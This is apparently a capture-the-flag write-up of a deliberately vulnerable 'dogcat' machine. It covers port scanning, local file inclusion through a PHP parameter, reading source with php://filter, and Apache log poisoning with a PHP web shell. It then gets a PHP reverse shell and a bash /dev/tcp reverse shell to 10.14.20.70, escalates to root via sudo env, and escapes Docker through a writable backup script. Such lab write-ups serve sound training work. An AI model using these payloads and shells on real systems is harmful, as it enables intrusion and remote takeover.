## Enumeration

```console
root@machine:~$ nmap 10.10.64.63 -T4
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-14 22:30 CET
Nmap scan report for localhost (10.10.64.63)
Host is up (0.043s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Only two ports open. So lets check 80 with the running http server. 

<div class="text-center">
    <img src="\assets\img\posts\dogcat\page.PNG" class="rounded img-fluid">   
</div>
<br/>

The url looks interesting. `?view=cat`. Seems to be anything with LFI (local file inclusion). We could try to modify it with:    
`http://IPAdress/view=../../../../../../../etc/passwd`

We get an error:
<div class="text-center">
    <img src="\assets\img\posts\dogcat\onlydogcat.PNG" class="rounded img-fluid">   
</div>
<br/>

Just add `dog` in front the string. So it looks like this: `http://IPAdress/?view=dog/../../../../../../../etc/passwd`

A new error appears:

<div class="text-center">
    <img src="\assets\img\posts\dogcat\newerror.PNG" class="rounded img-fluid">   
</div>
<br/>

On [Hacktricks PHP Wrappers](https://book.hacktricks.xyz/pentesting-web/file-inclusion#wrapper-php-filter) I found something interesting. With the string: `php://filter/convert.base64-encode/resource=dog` we can see the source code of the `dog.php` in base64 encoding.

For decoding I used my running burpsuite.

<div class="text-center">
    <img src="\assets\img\posts\dogcat\decodedog.PNG" class="rounded img-fluid">   
</div>
<br/>

```php
<img src="dogs/<?php echo rand(1, 10); ?>.jpg" />
```

This code prints just a random dog picture with every request. We can also look into the `php` code of the index.php. That is may more interesting.
Modify the string as follow: `?view=php://filter/convert.base64-encode/resource=dog/../index` and decode it again.

```php
<?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
```

Nice! We can modify the `ext` variable and set it to none. So we can our payload from the first try again.
`http://IPAdress/?view=dog/../../../../../../../etc/passwd&ext=`

It's working. We can see the "/passwd" file. With burpsuite we have also a pretty good format.

<div class="text-center">
    <img src="\assets\img\posts\dogcat\passwd.PNG" class="rounded img-fluid">   
</div>
<br/>

From my enumeration I know this is running on a apache server. We may can look for log files.
We finaly can find the at `/var/log/apache2/access.log`

<div class="text-center">
    <img src="\assets\img\posts\dogcat\log.PNG" class="rounded img-fluid">   
</div>
<br/>

Our User-Agent Header is beeing inside the logfile. We may can modify it that it will be executed with our main.php file. We try at first:
`<?php system("ls")?>` Ooops. This endend a few times with fatal error and I was not able to view the logs again. So I have restartet the machine more than 3 times.  
Finally the User-Agent:`<?php system($_GET['cmd']);?>` and the GET string `/?view=dog/../../../../../../../var/log/apache2/access.log&ext=&cmd=ls` was fine and i was able to see the RCE.

<div class="text-center">
    <img src="\assets\img\posts\dogcat\rce.PNG" class="rounded img-fluid">   
</div>
<br/>

So we just need to form a payload for a php reverse shell. I tried something new with the shell generator. [Generator](https://www.revshells.com/)

`php -r '$sock=fsockopen("10.14.20.70",9001);shell_exec("/bin/sh <&3 >&3 2>&3");'`

URL encoded: `/?view=dog/../../../../../../../var/log/apache2/access.log&ext=&cmd=php+-r+'$sock%3dfsockopen("10.14.20.70",9001)%3bshell_exec("/bin/sh+<%263+>%263+2>%263")%3b'`
We need to URL encode this string. In burpsuite pretty easy with `ctrl+u`. Set a listener up with and boom shell:

```console
root@machine:~$ nc -lvp 9001
listening on [any] 9001 ...
connect to [10.14.20.70] from localhost [10.10.21.32] 59000
ls
cat.php
cats
dog.php
dogs
flag.php
index.php
style.css
```
There we can find our first flag: `flag.php`

Flag 2 right next to it in the upper directory so only `cd..`

## Escalation

First try `sudo -l`

```console
sudo -l
Matching Defaults entries for www-data on 9e566ca216b3:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on 9e566ca216b3:
    (root) NOPASSWD: /usr/bin/env
```

Quick look to GTFObins and we find the way we can spawn a root shell.

`sudo env /bin/sh`

Boom root shell. Find the flag at `/root/flag3.txt`

## Escape docker

Looking around we find a `.dockerenv` file. So we are inside a docker container.
Further enumeration we can spot a interesting file inside `/opt/backups`, we see a `backup.sh` with write permissions.  

```console
tar cf /root/container/backup/backup.tar /root/container
```

Its frequently backups the container certainly with a cron job.
We put a simple reverse shell inside the `backup.sh` and set up a nc listener.

```console
echo "/bin/sh -i >& /dev/tcp/10.14.20.70/9002 0>&1" >> backup.sh
```

Boom Shell. Now we are on the machine itself and escaped the docker container. The fourth flag is inside the `/root` dir.
